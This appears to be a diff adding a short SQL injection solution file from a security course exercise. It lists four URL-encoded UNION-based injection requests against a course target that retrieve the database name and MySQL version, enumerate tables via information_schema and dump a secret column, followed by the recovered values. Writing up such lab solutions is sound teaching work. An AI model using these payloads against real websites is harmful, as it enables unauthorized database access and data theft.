@@ -1,0 +1,9 @@
+http://permalink.co/sqlinject3/?id=2%27+union+select+all+%271%27%2Cdatabase%28%29%2C%27%26%27+order+by+1%3B%23
+http://permalink.co/sqlinject3/?id=2%27+union+select+all+%271%27%2Cversion%28%29%2C%27%26%27+order+by+1%3B%23
+http://permalink.co/sqlinject3/?id=1%27+union+select+%270%27%2C%271%27%2CGROUP_CONCAT%28table_name+SEPARATOR+%27+%27%29+from+information_schema.tables+where+table_type%3D%27base+table%27+order+by+1%23%28will+get+SECRETTABLE+foo+inject3_users%29
+http://permalink.co/sqlinject3/?id=1%27+union+select+%270%27%2C%271%27%2CGROUP_CONCAT%28secret+SEPARATOR+%27+%27%29+from+SECRETTABLE+order+by+1%23
+
+Name: proj2_xtra_cr3dit
+Version: 5.5.44-0ubuntu0.14.04.1
+Tables: SECRETTABLE,foo,inject3_users
+Secret: hunter2
